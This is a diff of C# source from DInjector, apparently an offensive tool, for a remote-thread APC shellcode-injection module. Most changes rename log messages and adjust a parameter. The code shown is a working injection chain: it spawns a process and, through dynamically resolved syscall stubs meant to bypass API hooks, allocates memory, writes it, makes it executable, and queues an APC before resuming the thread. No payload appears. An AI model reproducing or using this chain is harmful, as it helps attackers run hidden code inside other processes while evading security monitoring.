@@ -43,7 +43,7 @@ namespace DInjector
             ref IntPtr BaseAddress,
             ref IntPtr RegionSize,
             uint NewProtect,
-            ref uint OldProtect);
+            out uint OldProtect);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         delegate DI.Data.Native.NTSTATUS NtOpenThread(
@@ -109,16 +109,16 @@ namespace DInjector
 
             if (result)
             {
-                Console.WriteLine("(Module) [+] CreateProcess");
+                Console.WriteLine("(RemoteThreadAPC) [+] CreateProcess");
             }
             else
             {
-                Console.WriteLine("(Module) [-] CreateProcess");
+                Console.WriteLine("(RemoteThreadAPC) [-] CreateProcess");
             }
 
             #endregion
 
-            #region NtAllocateVirtualMemory
+            #region NtAllocateVirtualMemory (PAGE_READWRITE)
 
             IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtAllocateVirtualMemory");
             NtAllocateVirtualMemory sysNtAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));
@@ -138,11 +138,11 @@ namespace DInjector
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtAllocateVirtualMemory");
+                Console.WriteLine("(RemoteThreadAPC) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtAllocateVirtualMemory: {ntstatus}");
+                Console.WriteLine($"(RemoteThreadAPC) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");
             }
 
             #endregion
@@ -166,38 +166,36 @@ namespace DInjector
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtWriteVirtualMemory");
+                Console.WriteLine("(RemoteThreadAPC) [+] NtWriteVirtualMemory");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtWriteVirtualMemory: {ntstatus}");
+                Console.WriteLine($"(RemoteThreadAPC) [-] NtWriteVirtualMemory: {ntstatus}");
             }
 
             Marshal.FreeHGlobal(buffer);
 
             #endregion
 
-            #region NtProtectVirtualMemory
+            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)
 
             stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
             NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));
-
-            uint oldProtect = 0;
 
             ntstatus = sysNtProtectVirtualMemory(
                 hProcess,
                 ref baseAddress,
                 ref regionSize,
                 DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
-                ref oldProtect);
+                out uint _);
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtProtectVirtualMemory");
+                Console.WriteLine("(RemoteThreadAPC) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtProtectVirtualMemory: {ntstatus}");
+                Console.WriteLine($"(RemoteThreadAPC) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");
             }
 
             #endregion
@@ -219,11 +217,11 @@ namespace DInjector
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtOpenThread");
+                Console.WriteLine("(RemoteThreadAPC) [+] NtOpenThread");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtOpenThread: {ntstatus}");
+                Console.WriteLine($"(RemoteThreadAPC) [-] NtOpenThread: {ntstatus}");
             }
 
             #endregion
@@ -242,11 +240,11 @@ namespace DInjector
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtQueueApcThread");
+                Console.WriteLine("(RemoteThreadAPC) [+] NtQueueApcThread");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtQueueApcThread: {ntstatus}");
+                Console.WriteLine($"(RemoteThreadAPC) [-] NtQueueApcThread: {ntstatus}");
             }
 
             #endregion
@@ -264,11 +262,11 @@ namespace DInjector
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtAlertResumeThread");
+                Console.WriteLine("(RemoteThreadAPC) [+] NtAlertResumeThread");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtAlertResumeThread: {ntstatus}");
+                Console.WriteLine($"(RemoteThreadAPC) [-] NtAlertResumeThread: {ntstatus}");
             }
 
             #endregion
